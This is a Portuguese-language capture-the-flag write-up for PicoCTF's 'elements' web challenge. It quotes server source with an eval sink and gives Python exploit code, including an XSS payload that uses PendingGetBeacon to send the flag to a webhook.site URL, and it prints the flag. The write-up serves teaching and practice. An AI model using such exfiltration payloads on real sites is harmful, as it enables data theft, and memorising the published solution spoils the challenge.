# WriteUp: elements
## Descrição do desafio
**Author**: ehhthing \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/447?category=1&page=4) \
**Categoria**: Web Exploitation \
**Dificuldade**: Difícil \
**Data**: 2024 \
**Descrição**:
> Insert Standard Web Challenge Here.
> Source code: elements.tar.gz.
> Craft some magic up here.

## Passo a Passo da Solução
### 1. Análise do código fonte
O desafio fornece os arquivos fonte do servidor (`elements.tar.gz`) por trás do website alvo. O principal arquivo a se notar é o `index.mjs`, nele descobrimos o path `/remoteCraft`. Esse path aceita um parameter chamado recipe, que passa pelas verificações:
``` javascript
if (url.pathname === '/remoteCraft') {
		try {
			const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
			assert(typeof xss === 'string');
			assert(xss.length < 300);
			assert(recipe instanceof Array);
			assert(recipe.length < 50);
			for (const step of recipe) {
				assert(step instanceof Array);
				assert(step.length === 2);
				for (const element of step) {
					assert(typeof xss === 'string');
					assert(element.length < 50);
				}
			}
			visit({ recipe, xss });
		} catch(e) {
			console.error(e);
			return res.writeHead(400).end('invalid recipe!');
		}
return res.end('visiting!');
```
Reparamos na chamada da função `visit({ recipe, xss})`. Vamos examinar essa função:
``` javascript
async function visit(state) {
	if (visiting) return;
	visiting = true;

	state = {...state, flag }

	const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));

	await mkdir(join(userDataDir, 'Default'));
	await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
		net: {
			network_prediction_options: 2
		}
	}));

	const proc = spawn(
		'/usr/bin/chromium-browser-unstable', [
			`--user-data-dir=${userDataDir}`,
			'--profile-directory=Default',
			'--no-sandbox',
			'--js-flags=--noexpose_wasm,--jitless',
			'--disable-gpu',
			'--no-first-run',
			'--enable-experimental-web-platform-features',
			`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`
		],
		{ detached: true }
	)

	await sleep(10000);
	try {
		process.kill(-proc.pid)
	} catch(e) {}
	await sleep(500);

	await rm(userDataDir, { recursive: true, force: true, maxRetries: 10 });

	visiting = false;
}
```
Podemos ver que essa função cria uma nova instância do chromium rodando dentro do servidor com uma aba aberta na url `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`. A variável state está armazenando tanto os paramêtros recipe e xss quanto a flag do desafio. \ 
Agora, se formos examinar o arquivo `index.js`, encontramos a função: 
``` javascript
const evaluate = (...items) => {
	const [a, b] = items.sort();
	for (const [ingredientA, ingredientB, result] of recipes) {
		if (ingredientA === a && ingredientB == b) {
			if (result === 'XSS' && state.xss) {
				eval(state.xss);
			}
			return result;
		}
	}
	return null;
}
```
Essa função é responsável por executar as receitas descritas no `state.recipe`. Contudo, se o resultado da tarefa for igual a XSS, qualquer código dentro de `state.xss` será executado.
### 2. Solucionando o desafio
A estratégia para solucionar o desafio começa encontrando um array recipe com a sequência correta de receitas que gera um elemento XSS. No código python `exploit.py`, a função `find_sequence` será responsável por encontrar este array:
``` python
def find_sequence():
    orig = ['Fire', 'Water', 'Earth', 'Air']
    dependencies = {}
    for r in all_recipes:
        dependencies[r[2]] = [r[0], r[1]]

    dep_graph = {}

    def trace_dependency(dep):
        if dep in dependencies:
            dep_graph[dep] = set(dependencies[dep])
            for d in dependencies[dep]:
                if d in orig:
                    continue
                trace_dependency(d)

    trace_dependency("XSS")

    ts = graphlib.TopologicalSorter(dep_graph)
    res_order = list(ts.static_order())

    res_lst = [dependencies[k] for k in res_order if k in dependencies]
    return res_lst
sequence = find_sequence()
```
Agora, precisamos criar uma forma de transferir dados da aplicação aberta no chromium do server para nosso computador. Para receber os dados, utilizaremos o website webhook.site. Para enviá-los do servidor, teremos que injetar algum código javascript pelo paramater xss. O servidor está bloqueando a maioria das formas de se comunicar com outros sites pelo navegador chromium, tal como o `fetch`. Contudo, observamos que foi habilitada a opção `--enable-experimental-web-platform-features`. Desse modo, é possível usar uma função chamada `PendingGetBeacon`: 
``` python
parameters = {
    "recipe": sequence, 
    "xss": 'let pd = new PendingGetBeacon(`https://webhook.site/6850a7e0-1488-4bd2-ad3b-cdc1db0f28b1/${state.flag}`); pd.sendNow();'
}

print(sequence)

encoded_params = urlencode({"recipe": json.dumps(parameters)})

url = f"{base_url}{path}?{encoded_params}"

print(f"URL gerada: {url}")

response = requests.get(url) 
print(response.text)
```
Recebemos no webhook: *picoCTF%7Blittle_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a%7D%20btw%20contact%20me%20on%20discord%20with%20ur%20solution%20thanks%20@ehhthing* \
Decodificando-o obtemos: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} btw contact me on discord with ur solution thanks @ehhthing \
Logo a flag é: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}

## Autor da WriteUp
[Membro de Networking - Luiz Felipe](https://github.com/LuizF14)
